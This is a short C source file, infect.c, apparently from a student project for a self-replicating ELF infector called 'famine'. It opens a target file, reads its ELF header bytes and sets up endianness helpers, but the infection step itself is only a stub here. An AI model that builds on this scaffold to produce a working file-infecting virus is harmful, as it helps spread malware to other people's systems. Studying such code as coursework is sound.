/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/05 01:13:08 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"

static inline void	set_endian(struct famine *food, bool big_mode)
{
	uint16_t	(*mode_2[])(uint16_t) =
	{
		endian_2_noswap,
		endian_2_swap
	};
	uint32_t	(*mode_4[])(uint32_t) =
	{
		endian_4_noswap,
		endian_4_swap
	};
	uint64_t	(*mode_8[])(uint64_t) =
	{
		endian_8_noswap,
		endian_8_swap
	};

	food->endian_2 = mode_2[big_mode];
	food->endian_4 = mode_4[big_mode];
	food->endian_8 = mode_8[big_mode];
}

inline void		infect_if_candidate(const char *file)
{
	int		fd = famine_open(file, O_RDONLY);
	if (fd < 0) return;

	unsigned char	e_ident[16];
	if (famine_read(fd, e_ident, 16) < 16) return;

	struct famine	food;
	set_endian(&food, e_ident[EI_DATA] == ELFDATA2MSB);

	// printf("[%s]\n", file);

	famine_close(fd);
}
